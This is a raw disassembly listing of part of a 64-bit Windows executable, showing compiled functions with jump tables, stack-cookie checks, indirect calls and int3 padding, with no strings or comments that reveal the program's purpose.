   140004b63:	0f 29 4c 24 40       	movaps %xmm1,0x40(%rsp)
   140004b68:	ff 15 42 69 02 00    	call   *0x26942(%rip)        # 0x14002b4b0
   140004b6e:	4c 8d 5c 24 70       	lea    0x70(%rsp),%r11
   140004b73:	f7 d8                	neg    %eax
   140004b75:	49 8b 5b 10          	mov    0x10(%r11),%rbx
   140004b79:	49 8b 73 18          	mov    0x18(%r11),%rsi
   140004b7d:	1b c0                	sbb    %eax,%eax
   140004b7f:	49 8b e3             	mov    %r11,%rsp
   140004b82:	5f                   	pop    %rdi
   140004b83:	c3                   	ret
   140004b84:	cc                   	int3
   140004b85:	cc                   	int3
   140004b86:	cc                   	int3
   140004b87:	cc                   	int3
   140004b88:	cc                   	int3
   140004b89:	cc                   	int3
   140004b8a:	cc                   	int3
   140004b8b:	cc                   	int3
   140004b8c:	cc                   	int3
   140004b8d:	cc                   	int3
   140004b8e:	cc                   	int3
   140004b8f:	cc                   	int3
   140004b90:	48 8b 81 10 20 00 00 	mov    0x2010(%rcx),%rax
   140004b97:	8b 90 28 10 00 00    	mov    0x1028(%rax),%edx
   140004b9d:	0f b6 81 79 30 00 00 	movzbl 0x3079(%rcx),%eax
   140004ba4:	03 d2                	add    %edx,%edx
   140004ba6:	0b d0                	or     %eax,%edx
   140004ba8:	81 c2 98 fd ff ff    	add    $0xfffffd98,%edx
   140004bae:	83 fa 0b             	cmp    $0xb,%edx
   140004bb1:	77 61                	ja     0x140004c14
   140004bb3:	48 63 c2             	movslq %edx,%rax
   140004bb6:	48 8d 15 43 b4 ff ff 	lea    -0x4bbd(%rip),%rdx        # 0x140000000
   140004bbd:	8b 8c 82 18 4c 00 00 	mov    0x4c18(%rdx,%rax,4),%ecx
   140004bc4:	48 03 ca             	add    %rdx,%rcx
   140004bc7:	ff e1                	jmp    *%rcx
   140004bc9:	ba 68 01 00 00       	mov    $0x168,%edx
   140004bce:	b9 01 00 00 00       	mov    $0x1,%ecx
   140004bd3:	e9 c0 03 01 00       	jmp    0x140014f98
   140004bd8:	ba 88 01 00 00       	mov    $0x188,%edx
   140004bdd:	b9 01 00 00 00       	mov    $0x1,%ecx
   140004be2:	e9 b1 03 01 00       	jmp    0x140014f98
   140004be7:	ba 90 01 00 00       	mov    $0x190,%edx
   140004bec:	b9 01 00 00 00       	mov    $0x1,%ecx
   140004bf1:	e9 a2 03 01 00       	jmp    0x140014f98
   140004bf6:	ba b0 01 00 00       	mov    $0x1b0,%edx
   140004bfb:	b9 01 00 00 00       	mov    $0x1,%ecx
   140004c00:	e9 93 03 01 00       	jmp    0x140014f98
   140004c05:	ba c8 01 00 00       	mov    $0x1c8,%edx
   140004c0a:	b9 01 00 00 00       	mov    $0x1,%ecx
   140004c0f:	e9 84 03 01 00       	jmp    0x140014f98
   140004c14:	33 c0                	xor    %eax,%eax
   140004c16:	c3                   	ret
   140004c17:	90                   	nop
   140004c18:	c9                   	leave
   140004c19:	4b 00 00             	rex.WXB add %al,(%r8)
   140004c1c:	14 4c                	adc    $0x4c,%al
   140004c1e:	00 00                	add    %al,(%rax)
   140004c20:	d8 4b 00             	fmuls  0x0(%rbx)
   140004c23:	00 14 4c             	add    %dl,(%rsp,%rcx,2)
   140004c26:	00 00                	add    %al,(%rax)
   140004c28:	e7 4b                	out    %eax,$0x4b
   140004c2a:	00 00                	add    %al,(%rax)
   140004c2c:	14 4c                	adc    $0x4c,%al
   140004c2e:	00 00                	add    %al,(%rax)
   140004c30:	f6 4b 00 00          	testb  $0x0,0x0(%rbx)
   140004c34:	14 4c                	adc    $0x4c,%al
   140004c36:	00 00                	add    %al,(%rax)
   140004c38:	f6 4b 00 00          	testb  $0x0,0x0(%rbx)
   140004c3c:	14 4c                	adc    $0x4c,%al
   140004c3e:	00 00                	add    %al,(%rax)
   140004c40:	05 4c 00 00 05       	add    $0x500004c,%eax
   140004c45:	4c 00 00             	rex.WR add %r8b,(%rax)
   140004c48:	cc                   	int3
   140004c49:	cc                   	int3
   140004c4a:	cc                   	int3
   140004c4b:	cc                   	int3
   140004c4c:	cc                   	int3
   140004c4d:	cc                   	int3
   140004c4e:	cc                   	int3
   140004c4f:	cc                   	int3
   140004c50:	48 85 c9             	test   %rcx,%rcx
   140004c53:	74 22                	je     0x140004c77
   140004c55:	53                   	push   %rbx
   140004c56:	48 83 ec 20          	sub    $0x20,%rsp
   140004c5a:	48 8b 05 67 d1 03 00 	mov    0x3d167(%rip),%rax        # 0x140041dc8
   140004c61:	48 8b d9             	mov    %rcx,%rbx
   140004c64:	ff 15 46 68 02 00    	call   *0x26846(%rip)        # 0x14002b4b0
   140004c6a:	48 8b cb             	mov    %rbx,%rcx
   140004c6d:	e8 2e 03 01 00       	call   0x140014fa0
   140004c72:	48 83 c4 20          	add    $0x20,%rsp
   140004c76:	5b                   	pop    %rbx
   140004c77:	c3                   	ret
   140004c78:	cc                   	int3
   140004c79:	cc                   	int3
   140004c7a:	cc                   	int3
   140004c7b:	cc                   	int3
   140004c7c:	cc                   	int3
   140004c7d:	cc                   	int3
   140004c7e:	cc                   	int3
   140004c7f:	cc                   	int3
   140004c80:	40 53                	rex push %rbx
   140004c82:	48 81 ec a0 00 00 00 	sub    $0xa0,%rsp
   140004c89:	48 8b 05 b0 93 03 00 	mov    0x393b0(%rip),%rax        # 0x14003e040
   140004c90:	48 33 c4             	xor    %rsp,%rax
   140004c93:	48 89 84 24 90 00 00 	mov    %rax,0x90(%rsp)
   140004c9a:	00 
   140004c9b:	48 8b 05 e6 d1 03 00 	mov    0x3d1e6(%rip),%rax        # 0x140041e88
   140004ca2:	48 8b d9             	mov    %rcx,%rbx
   140004ca5:	48 8d 4c 24 60       	lea    0x60(%rsp),%rcx
   140004caa:	ff 15 00 68 02 00    	call   *0x26800(%rip)        # 0x14002b4b0
   140004cb0:	8b 43 14             	mov    0x14(%rbx),%eax
   140004cb3:	48 8d 54 24 60       	lea    0x60(%rsp),%rdx
   140004cb8:	89 84 24 80 00 00 00 	mov    %eax,0x80(%rsp)
   140004cbf:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140004cc4:	8b 43 18             	mov    0x18(%rbx),%eax
   140004cc7:	89 84 24 84 00 00 00 	mov    %eax,0x84(%rsp)
   140004cce:	48 8b 05 eb d0 03 00 	mov    0x3d0eb(%rip),%rax        # 0x140041dc0
   140004cd5:	c7 44 24 70 01 00 00 	movl   $0x1,0x70(%rsp)
   140004cdc:	00 
   140004cdd:	ff 15 cd 67 02 00    	call   *0x267cd(%rip)        # 0x14002b4b0
   140004ce3:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140004ce8:	0f 10 00             	movups (%rax),%xmm0
   140004ceb:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   140004cef:	48 8b 05 a2 d1 03 00 	mov    0x3d1a2(%rip),%rax        # 0x140041e98
   140004cf6:	0f 29 44 24 20       	movaps %xmm0,0x20(%rsp)
   140004cfb:	0f 29 4c 24 30       	movaps %xmm1,0x30(%rsp)
   140004d00:	ff 15 aa 67 02 00    	call   *0x267aa(%rip)        # 0x14002b4b0
   140004d06:	f7 d8                	neg    %eax
   140004d08:	1b c0                	sbb    %eax,%eax
   140004d0a:	48 8b 8c 24 90 00 00 	mov    0x90(%rsp),%rcx
   140004d11:	00 
   140004d12:	48 33 cc             	xor    %rsp,%rcx
   140004d15:	e8 a6 78 00 00       	call   0x14000c5c0
   140004d1a:	48 81 c4 a0 00 00 00 	add    $0xa0,%rsp
   140004d21:	5b                   	pop    %rbx
   140004d22:	c3                   	ret
   140004d23:	cc                   	int3
   140004d24:	cc                   	int3
   140004d25:	cc                   	int3
   140004d26:	cc                   	int3
   140004d27:	cc                   	int3
   140004d28:	cc                   	int3
   140004d29:	cc                   	int3
   140004d2a:	cc                   	int3
   140004d2b:	cc                   	int3
   140004d2c:	cc                   	int3
   140004d2d:	cc                   	int3
   140004d2e:	cc                   	int3
   140004d2f:	cc                   	int3
   140004d30:	4c 8b 4a 08          	mov    0x8(%rdx),%r9
   140004d34:	44 8b 02             	mov    (%rdx),%r8d
   140004d37:	e9 f4 fa ff ff       	jmp    0x140004830
   140004d3c:	cc                   	int3
   140004d3d:	cc                   	int3
   140004d3e:	cc                   	int3
   140004d3f:	cc                   	int3
   140004d40:	48 89 5c 24 18       	mov    %rbx,0x18(%rsp)
   140004d45:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140004d4a:	57                   	push   %rdi
   140004d4b:	b8 80 20 00 00       	mov    $0x2080,%eax
   140004d50:	e8 6b 7b 00 00       	call   0x14000c8c0
   140004d55:	48 2b e0             	sub    %rax,%rsp
   140004d58:	48 8b 05 e1 92 03 00 	mov    0x392e1(%rip),%rax        # 0x14003e040
   140004d5f:	48 33 c4             	xor    %rsp,%rax
   140004d62:	48 89 84 24 70 20 00 	mov    %rax,0x2070(%rsp)
   140004d69:	00 
   140004d6a:	48 8d 05 7f 79 02 00 	lea    0x2797f(%rip),%rax        # 0x14002c6f0
   140004d71:	48 8b fa             	mov    %rdx,%rdi
   140004d74:	48 8b f1             	mov    %rcx,%rsi
   140004d77:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140004d7c:	4c 8d 8a 22 20 00 00 	lea    0x2022(%rdx),%r9
   140004d83:	c7 44 24 20 5c 00 00 	movl   $0x5c,0x20(%rsp)
   140004d8a:	00 
   140004d8b:	4c 8d 05 d2 6f 02 00 	lea    0x26fd2(%rip),%r8        # 0x14002bd64
   140004d92:	ba 00 10 00 00       	mov    $0x1000,%edx
   140004d97:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   140004d9c:	e8 df ce ff ff       	call   0x140001c80
   140004da1:	3d 00 10 00 00       	cmp    $0x1000,%eax
   140004da6:	0f 8d ad 00 00 00    	jge    0x140004e59
   140004dac:	48 8d 05 55 79 02 00 	lea    0x27955(%rip),%rax        # 0x14002c708
   140004db3:	ba 00 10 00 00       	mov    $0x1000,%edx
   140004db8:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140004dbd:	4c 8d 8f 22 20 00 00 	lea    0x2022(%rdi),%r9
   140004dc4:	4c 8d 05 99 6f 02 00 	lea    0x26f99(%rip),%r8        # 0x14002bd64
   140004dcb:	c7 44 24 20 5c 00 00 	movl   $0x5c,0x20(%rsp)
   140004dd2:	00 
   140004dd3:	48 8d 8c 24 60 10 00 	lea    0x1060(%rsp),%rcx
   140004dda:	00 
   140004ddb:	e8 a0 ce ff ff       	call   0x140001c80
   140004de0:	3d 00 10 00 00       	cmp    $0x1000,%eax
   140004de5:	7d 72                	jge    0x140004e59
   140004de7:	45 33 c0             	xor    %r8d,%r8d
   140004dea:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   140004def:	33 d2                	xor    %edx,%edx
   140004df1:	e8 0a 46 00 00       	call   0x140009400
   140004df6:	45 33 c0             	xor    %r8d,%r8d
   140004df9:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   140004dfe:	33 d2                	xor    %edx,%edx
   140004e00:	48 8d 8c 24 60 10 00 	lea    0x1060(%rsp),%rcx
   140004e07:	00 
   140004e08:	e8 f3 45 00 00       	call   0x140009400
   140004e0d:	45 33 c0             	xor    %r8d,%r8d
   140004e10:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   140004e15:	33 d2                	xor    %edx,%edx
   140004e17:	48 8d 8f 22 20 00 00 	lea    0x2022(%rdi),%rcx
   140004e1e:	e8 dd 45 00 00       	call   0x140009400
   140004e23:	4c 8d 4c 24 30       	lea    0x30(%rsp),%r9
   140004e28:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   140004e2d:	41 b8 03 00 00 00    	mov    $0x3,%r8d
   140004e33:	48 8b d7             	mov    %rdi,%rdx
   140004e36:	48 8b ce             	mov    %rsi,%rcx
   140004e39:	e8 f2 fa ff ff       	call   0x140004930
   140004e3e:	8b f8                	mov    %eax,%edi
   140004e40:	33 db                	xor    %ebx,%ebx
   140004e42:	48 8b 4c dc 30       	mov    0x30(%rsp,%rbx,8),%rcx
   140004e47:	e8 54 01 01 00       	call   0x140014fa0
   140004e4c:	48 ff c3             	inc    %rbx
   140004e4f:	48 83 fb 03          	cmp    $0x3,%rbx
   140004e53:	7c ed                	jl     0x140004e42
   140004e55:	8b c7                	mov    %edi,%eax
   140004e57:	eb 05                	jmp    0x140004e5e
   140004e59:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   140004e5e:	48 8b 8c 24 70 20 00 	mov    0x2070(%rsp),%rcx
   140004e65:	00 
   140004e66:	48 33 cc             	xor    %rsp,%rcx
   140004e69:	e8 52 77 00 00       	call   0x14000c5c0
   140004e6e:	4c 8d 9c 24 80 20 00 	lea    0x2080(%rsp),%r11
   140004e75:	00 
   140004e76:	49 8b 5b 20          	mov    0x20(%r11),%rbx
   140004e7a:	49 8b 73 28          	mov    0x28(%r11),%rsi
   140004e7e:	49 8b e3             	mov    %r11,%rsp
   140004e81:	5f                   	pop    %rdi
   140004e82:	c3                   	ret
   140004e83:	cc                   	int3
   140004e84:	cc                   	int3
   140004e85:	cc                   	int3
   140004e86:	cc                   	int3
   140004e87:	cc                   	int3
   140004e88:	cc                   	int3
   140004e89:	cc                   	int3
   140004e8a:	cc                   	int3
   140004e8b:	cc                   	int3
   140004e8c:	cc                   	int3
   140004e8d:	cc                   	int3
   140004e8e:	cc                   	int3
   140004e8f:	cc                   	int3
   140004e90:	48 83 ec 28          	sub    $0x28,%rsp
   140004e94:	48 8b 82 10 20 00 00 	mov    0x2010(%rdx),%rax
   140004e9b:	4c 8b ca             	mov    %rdx,%r9
   140004e9e:	44 8b 80 28 10 00 00 	mov    0x1028(%rax),%r8d
   140004ea5:	0f b6 82 79 30 00 00 	movzbl 0x3079(%rdx),%eax
   140004eac:	45 03 c0             	add    %r8d,%r8d
   140004eaf:	44 0b c0             	or     %eax,%r8d
   140004eb2:	41 81 c0 98 fd ff ff 	add    $0xfffffd98,%r8d
   140004eb9:	41 83 f8 0b          	cmp    $0xb,%r8d
   140004ebd:	77 4a                	ja     0x140004f09
   140004ebf:	49 63 c0             	movslq %r8d,%rax
   140004ec2:	4c 8d 05 37 b1 ff ff 	lea    -0x4ec9(%rip),%r8        # 0x140000000
   140004ec9:	41 8b 94 80 14 4f 00 	mov    0x4f14(%r8,%rax,4),%edx
   140004ed0:	00 
   140004ed1:	49 03 d0             	add    %r8,%rdx
   140004ed4:	ff e2                	jmp    *%rdx
   140004ed6:	48 8d 51 68          	lea    0x68(%rcx),%rdx
   140004eda:	eb 19                	jmp    0x140004ef5
   140004edc:	48 8d 91 f8 00 00 00 	lea    0xf8(%rcx),%rdx
   140004ee3:	eb 10                	jmp    0x140004ef5
   140004ee5:	48 8d 91 10 01 00 00 	lea    0x110(%rcx),%rdx
   140004eec:	eb 07                	jmp    0x140004ef5
   140004eee:	48 8d 91 18 01 00 00 	lea    0x118(%rcx),%rdx
   140004ef5:	4d 8d 41 10          	lea    0x10(%r9),%r8
   140004ef9:	e8 d2 fb ff ff       	call   0x140004ad0
   140004efe:	85 c0                	test   %eax,%eax
   140004f00:	78 07                	js     0x140004f09
   140004f02:	33 c0                	xor    %eax,%eax
   140004f04:	48 83 c4 28          	add    $0x28,%rsp
   140004f08:	c3                   	ret
   140004f09:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   140004f0e:	48 83 c4 28          	add    $0x28,%rsp
   140004f12:	c3                   	ret
   140004f13:	90                   	nop
   140004f14:	d6                   	udb
   140004f15:	4e 00 00             	rex.WRX add %r8b,(%rax)
   140004f18:	09 4f 00             	or     %ecx,0x0(%rdi)
   140004f1b:	00 d6                	add    %dl,%dh
   140004f1d:	4e 00 00             	rex.WRX add %r8b,(%rax)
   140004f20:	09 4f 00             	or     %ecx,0x0(%rdi)
   140004f23:	00 dc                	add    %bl,%ah
   140004f25:	4e 00 00             	rex.WRX add %r8b,(%rax)
   140004f28:	09 4f 00             	or     %ecx,0x0(%rdi)
   140004f2b:	00 e5                	add    %ah,%ch
   140004f2d:	4e 00 00             	rex.WRX add %r8b,(%rax)
   140004f30:	09 4f 00             	or     %ecx,0x0(%rdi)
   140004f33:	00 e5                	add    %ah,%ch
   140004f35:	4e 00 00             	rex.WRX add %r8b,(%rax)
   140004f38:	09 4f 00             	or     %ecx,0x0(%rdi)
   140004f3b:	00 ee                	add    %ch,%dh
   140004f3d:	4e 00 00             	rex.WRX add %r8b,(%rax)
   140004f40:	ee                   	out    %al,(%dx)
   140004f41:	4e 00 00             	rex.WRX add %r8b,(%rax)
   140004f44:	cc                   	int3
   140004f45:	cc                   	int3
   140004f46:	cc                   	int3
   140004f47:	cc                   	int3
   140004f48:	cc                   	int3
   140004f49:	cc                   	int3
   140004f4a:	cc                   	int3
   140004f4b:	cc                   	int3
   140004f4c:	cc                   	int3
   140004f4d:	cc                   	int3
   140004f4e:	cc                   	int3
   140004f4f:	cc                   	int3
   140004f50:	48 8b 82 10 20 00 00 	mov    0x2010(%rdx),%rax
   140004f57:	4c 8b ca             	mov    %rdx,%r9
   140004f5a:	44 8b 80 28 10 00 00 	mov    0x1028(%rax),%r8d
   140004f61:	0f b6 82 79 30 00 00 	movzbl 0x3079(%rdx),%eax
   140004f68:	45 03 c0             	add    %r8d,%r8d
   140004f6b:	44 0b c0             	or     %eax,%r8d
   140004f6e:	41 81 c0 98 fd ff ff 	add    $0xfffffd98,%r8d
   140004f75:	41 83 f8 0b          	cmp    $0xb,%r8d
   140004f79:	77 63                	ja     0x140004fde
   140004f7b:	49 63 c0             	movslq %r8d,%rax
   140004f7e:	4c 8d 05 7b b0 ff ff 	lea    -0x4f85(%rip),%r8        # 0x140000000
   140004f85:	41 8b 94 80 e4 4f 00 	mov    0x4fe4(%r8,%rax,4),%edx
   140004f8c:	00 
   140004f8d:	49 03 d0             	add    %r8,%rdx
   140004f90:	ff e2                	jmp    *%rdx
   140004f92:	4d 8d 81 22 20 00 00 	lea    0x2022(%r9),%r8
   140004f99:	48 8d 91 f0 00 00 00 	lea    0xf0(%rcx),%rdx
   140004fa0:	e9 2b fb ff ff       	jmp    0x140004ad0
   140004fa5:	4d 8d 81 22 20 00 00 	lea    0x2022(%r9),%r8
   140004fac:	48 8d 91 08 01 00 00 	lea    0x108(%rcx),%rdx
   140004fb3:	e9 18 fb ff ff       	jmp    0x140004ad0
   140004fb8:	4d 8d 81 22 20 00 00 	lea    0x2022(%r9),%r8
   140004fbf:	48 8d 91 20 01 00 00 	lea    0x120(%rcx),%rdx
   140004fc6:	e9 05 fb ff ff       	jmp    0x140004ad0
   140004fcb:	4d 8d 81 22 20 00 00 	lea    0x2022(%r9),%r8
   140004fd2:	48 8d 91 28 01 00 00 	lea    0x128(%rcx),%rdx
   140004fd9:	e9 f2 fa ff ff       	jmp    0x140004ad0
   140004fde:	b8 ff ff ff ff       	mov    $0xffffffff,%eax
   140004fe3:	c3                   	ret
   140004fe4:	92                   	xchg   %eax,%edx
   140004fe5:	4f 00 00             	rex.WRXB add %r8b,(%r8)
   140004fe8:	de 4f 00             	fimuls 0x0(%rdi)
   140004feb:	00 92 4f 00 00 de    	add    %dl,-0x21ffffb1(%rdx)
   140004ff1:	4f 00 00             	rex.WRXB add %r8b,(%r8)
   140004ff4:	a5                   	movsl  (%rsi),(%rdi)
   140004ff5:	4f 00 00             	rex.WRXB add %r8b,(%r8)
   140004ff8:	de 4f 00             	fimuls 0x0(%rdi)
   140004ffb:	00 b8 4f 00 00 de    	add    %bh,-0x21ffffb1(%rax)
   140005001:	4f 00 00             	rex.WRXB add %r8b,(%r8)
   140005004:	b8 4f 00 00 de       	mov    $0xde00004f,%eax
   140005009:	4f 00 00             	rex.WRXB add %r8b,(%r8)
   14000500c:	cb                   	lret
   14000500d:	4f 00 00             	rex.WRXB add %r8b,(%r8)
   140005010:	cb                   	lret
   140005011:	4f 00 00             	rex.WRXB add %r8b,(%r8)
   140005014:	cc                   	int3
   140005015:	cc                   	int3
   140005016:	cc                   	int3
   140005017:	cc                   	int3
   140005018:	cc                   	int3
   140005019:	cc                   	int3
   14000501a:	cc                   	int3
   14000501b:	cc                   	int3
   14000501c:	cc                   	int3
   14000501d:	cc                   	int3
   14000501e:	cc                   	int3
   14000501f:	cc                   	int3
   140005020:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140005025:	48 89 7c 24 10       	mov    %rdi,0x10(%rsp)
   14000502a:	55                   	push   %rbp
   14000502b:	48 8b ec             	mov    %rsp,%rbp
   14000502e:	48 83 ec 70          	sub    $0x70,%rsp
   140005032:	48 8b 82 10 20 00 00 	mov    0x2010(%rdx),%rax
   140005039:	49 8b f8             	mov    %r8,%rdi
   14000503c:	48 8b d9             	mov    %rcx,%rbx
   14000503f:	44 8b 88 28 10 00 00 	mov    0x1028(%rax),%r9d
   140005046:	0f b6 82 79 30 00 00 	movzbl 0x3079(%rdx),%eax
   14000504d:	45 03 c9             	add    %r9d,%r9d
   140005050:	44 0b c8             	or     %eax,%r9d
   140005053:	41 81 c1 98 fd ff ff 	add    $0xfffffd98,%r9d
   14000505a:	41 83 f9 0b          	cmp    $0xb,%r9d
   14000505e:	0f 87 96 02 00 00    	ja     0x1400052fa
   140005064:	48 8d 15 95 af ff ff 	lea    -0x506b(%rip),%rdx        # 0x140000000
   14000506b:	49 63 c1             	movslq %r9d,%rax
   14000506e:	8b 8c 82 14 53 00 00 	mov    0x5314(%rdx,%rax,4),%ecx
   140005075:	48 03 ca             	add    %rdx,%rcx
   140005078:	ff e1                	jmp    *%rcx
   14000507a:	c7 83 b8 00 00 00 01 	movl   $0x1,0xb8(%rbx)
   140005081:	00 00 00 
   140005084:	33 c9                	xor    %ecx,%ecx
   140005086:	89 8b 90 00 00 00    	mov    %ecx,0x90(%rbx)
   14000508c:	89 8b a8 00 00 00    	mov    %ecx,0xa8(%rbx)
   140005092:	41 8b 40 08          	mov    0x8(%r8),%eax
   140005096:	89 83 a0 00 00 00    	mov    %eax,0xa0(%rbx)
   14000509c:	41 39 48 04          	cmp    %ecx,0x4(%r8)
   1400050a0:	0f 94 c1             	sete   %cl
   1400050a3:	89 8b bc 00 00 00    	mov    %ecx,0xbc(%rbx)
   1400050a9:	41 8b 00             	mov    (%r8),%eax
   1400050ac:	89 83 ac 00 00 00    	mov    %eax,0xac(%rbx)
   1400050b2:	41 8b 40 0c          	mov    0xc(%r8),%eax
   1400050b6:	89 43 14             	mov    %eax,0x14(%rbx)
   1400050b9:	41 8b 40 10          	mov    0x10(%r8),%eax
   1400050bd:	89 43 18             	mov    %eax,0x18(%rbx)
   1400050c0:	41 8b 40 18          	mov    0x18(%r8),%eax
   1400050c4:	89 43 0c             	mov    %eax,0xc(%rbx)
   1400050c7:	49 63 40 1c          	movslq 0x1c(%r8),%rax
   1400050cb:	85 c0                	test   %eax,%eax
   1400050cd:	74 4f                	je     0x14000511e
   1400050cf:	48 8b 4f 20          	mov    0x20(%rdi),%rcx
   1400050d3:	4c 8d 83 80 00 00 00 	lea    0x80(%rbx),%r8
   1400050da:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   1400050df:	4c 8b c8             	mov    %rax,%r9
   1400050e2:	48 8b 05 07 cd 03 00 	mov    0x3cd07(%rip),%rax        # 0x140041df0
   1400050e9:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
   1400050ed:	48 8b d3             	mov    %rbx,%rdx
   1400050f0:	ff 15 ba 63 02 00    	call   *0x263ba(%rip)        # 0x14002b4b0
   1400050f6:	48 8d 4d c0          	lea    -0x40(%rbp),%rcx
   1400050fa:	0f 10 00             	movups (%rax),%xmm0
   1400050fd:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   140005101:	48 8b 05 90 cd 03 00 	mov    0x3cd90(%rip),%rax        # 0x140041e98
   140005108:	0f 29 45 c0          	movaps %xmm0,-0x40(%rbp)
   14000510c:	0f 29 4d d0          	movaps %xmm1,-0x30(%rbp)
   140005110:	ff 15 9a 63 02 00    	call   *0x2639a(%rip)        # 0x14002b4b0
   140005116:	85 c0                	test   %eax,%eax
   140005118:	0f 85 dc 01 00 00    	jne    0x1400052fa
   14000511e:	48 63 47 28          	movslq 0x28(%rdi),%rax
   140005122:	85 c0                	test   %eax,%eax
   140005124:	0f 84 b5 01 00 00    	je     0x1400052df
   14000512a:	4c 8d 43 70          	lea    0x70(%rbx),%r8
   14000512e:	e9 68 01 00 00       	jmp    0x14000529b
   140005133:	c7 83 c4 00 00 00 01 	movl   $0x1,0xc4(%rbx)
   14000513a:	00 00 00 
   14000513d:	33 c9                	xor    %ecx,%ecx
   14000513f:	89 8b 98 00 00 00    	mov    %ecx,0x98(%rbx)
   140005145:	89 8b b4 00 00 00    	mov    %ecx,0xb4(%rbx)
   14000514b:	41 8b 40 08          	mov    0x8(%r8),%eax
   14000514f:	89 83 ac 00 00 00    	mov    %eax,0xac(%rbx)
   140005155:	41 39 48 04          	cmp    %ecx,0x4(%r8)
   140005159:	0f 94 c1             	sete   %cl
   14000515c:	89 8b c8 00 00 00    	mov    %ecx,0xc8(%rbx)
   140005162:	41 8b 00             	mov    (%r8),%eax
   140005165:	89 83 b8 00 00 00    	mov    %eax,0xb8(%rbx)
   14000516b:	41 8b 40 0c          	mov    0xc(%r8),%eax
   14000516f:	89 43 14             	mov    %eax,0x14(%rbx)
   140005172:	41 8b 40 10          	mov    0x10(%r8),%eax
   140005176:	89 43 18             	mov    %eax,0x18(%rbx)
   140005179:	41 8b 40 18          	mov    0x18(%r8),%eax
   14000517d:	89 43 0c             	mov    %eax,0xc(%rbx)
   140005180:	49 63 40 1c          	movslq 0x1c(%r8),%rax
   140005184:	85 c0                	test   %eax,%eax
   140005186:	74 4f                	je     0x1400051d7
   140005188:	48 8b 4f 20          	mov    0x20(%rdi),%rcx
   14000518c:	4c 8d 83 88 00 00 00 	lea    0x88(%rbx),%r8
   140005193:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   140005198:	4c 8b c8             	mov    %rax,%r9
   14000519b:	48 8b 05 4e cc 03 00 	mov    0x3cc4e(%rip),%rax        # 0x140041df0
   1400051a2:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
   1400051a6:	48 8b d3             	mov    %rbx,%rdx
   1400051a9:	ff 15 01 63 02 00    	call   *0x26301(%rip)        # 0x14002b4b0
   1400051af:	48 8d 4d c0          	lea    -0x40(%rbp),%rcx
   1400051b3:	0f 10 00             	movups (%rax),%xmm0
   1400051b6:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   1400051ba:	48 8b 05 d7 cc 03 00 	mov    0x3ccd7(%rip),%rax        # 0x140041e98
   1400051c1:	0f 29 45 c0          	movaps %xmm0,-0x40(%rbp)
   1400051c5:	0f 29 4d d0          	movaps %xmm1,-0x30(%rbp)
   1400051c9:	ff 15 e1 62 02 00    	call   *0x262e1(%rip)        # 0x14002b4b0
   1400051cf:	85 c0                	test   %eax,%eax
   1400051d1:	0f 85 23 01 00 00    	jne    0x1400052fa
   1400051d7:	48 63 47 28          	movslq 0x28(%rdi),%rax
   1400051db:	85 c0                	test   %eax,%eax
   1400051dd:	0f 84 fc 00 00 00    	je     0x1400052df
   1400051e3:	4c 8d 43 78          	lea    0x78(%rbx),%r8
   1400051e7:	e9 af 00 00 00       	jmp    0x14000529b
   1400051ec:	c7 83 d4 00 00 00 01 	movl   $0x1,0xd4(%rbx)
   1400051f3:	00 00 00 
   1400051f6:	33 c9                	xor    %ecx,%ecx
   1400051f8:	89 8b a8 00 00 00    	mov    %ecx,0xa8(%rbx)
   1400051fe:	89 8b c4 00 00 00    	mov    %ecx,0xc4(%rbx)
   140005204:	41 8b 40 08          	mov    0x8(%r8),%eax
   140005208:	89 83 bc 00 00 00    	mov    %eax,0xbc(%rbx)
   14000520e:	41 39 48 04          	cmp    %ecx,0x4(%r8)
   140005212:	0f 94 c1             	sete   %cl
   140005215:	89 8b d8 00 00 00    	mov    %ecx,0xd8(%rbx)
   14000521b:	41 8b 00             	mov    (%r8),%eax
   14000521e:	89 83 c8 00 00 00    	mov    %eax,0xc8(%rbx)
   140005224:	41 8b 40 0c          	mov    0xc(%r8),%eax
   140005228:	89 43 14             	mov    %eax,0x14(%rbx)
   14000522b:	41 8b 40 10          	mov    0x10(%r8),%eax
   14000522f:	89 43 18             	mov    %eax,0x18(%rbx)
   140005232:	41 8b 40 18          	mov    0x18(%r8),%eax
   140005236:	89 43 0c             	mov    %eax,0xc(%rbx)
   140005239:	49 63 40 1c          	movslq 0x1c(%r8),%rax
   14000523d:	85 c0                	test   %eax,%eax
   14000523f:	74 4b                	je     0x14000528c
   140005241:	48 8b 4f 20          	mov    0x20(%rdi),%rcx
   140005245:	4c 8d 83 98 00 00 00 	lea    0x98(%rbx),%r8
   14000524c:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   140005251:	4c 8b c8             	mov    %rax,%r9
   140005254:	48 8b 05 95 cb 03 00 	mov    0x3cb95(%rip),%rax        # 0x140041df0
   14000525b:	48 8d 4d e0          	lea    -0x20(%rbp),%rcx
   14000525f:	48 8b d3             	mov    %rbx,%rdx
   140005262:	ff 15 48 62 02 00    	call   *0x26248(%rip)        # 0x14002b4b0
   140005268:	48 8d 4d c0          	lea    -0x40(%rbp),%rcx
   14000526c:	0f 10 00             	movups (%rax),%xmm0
   14000526f:	0f 10 48 10          	movups 0x10(%rax),%xmm1
   140005273:	48 8b 05 1e cc 03 00 	mov    0x3cc1e(%rip),%rax        # 0x140041e98
   14000527a:	0f 29 45 c0          	movaps %xmm0,-0x40(%rbp)
   14000527e:	0f 29 4d d0          	movaps %xmm1,-0x30(%rbp)
   140005282:	ff 15 28 62 02 00    	call   *0x26228(%rip)        # 0x14002b4b0
